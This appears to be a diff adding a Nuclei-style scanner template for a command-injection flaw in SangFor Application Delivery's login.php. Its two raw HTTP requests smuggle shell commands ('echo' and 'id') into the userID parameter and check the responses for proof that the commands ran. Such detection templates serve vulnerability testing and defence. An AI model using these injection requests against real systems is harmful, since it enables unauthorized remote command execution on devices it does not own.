@@ -1,0 +1,43 @@
+id: sangfor-login-command-execution
+info:
+  name: SangFor Application Delivery login.php Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploitation of the login.php file in SangFor Application Delivery allows remote command execution via crafted input in the userID parameter.
+  tags: command-execution
+  reference:
+    - https://fofa.info
+http:
+  - raw:
+      - |
+        GET /report/script/login.php?userID=admin;echo {{randstr}};&userPsw=admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    extractors:
+      - type: regex
+        name: echo_output
+        regex:
+          - "{{randstr}}"
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{randstr}}"
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /report/script/login.php?userID=admin;id;&userPsw=admin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+      - type: status
+        status:
+          - 200
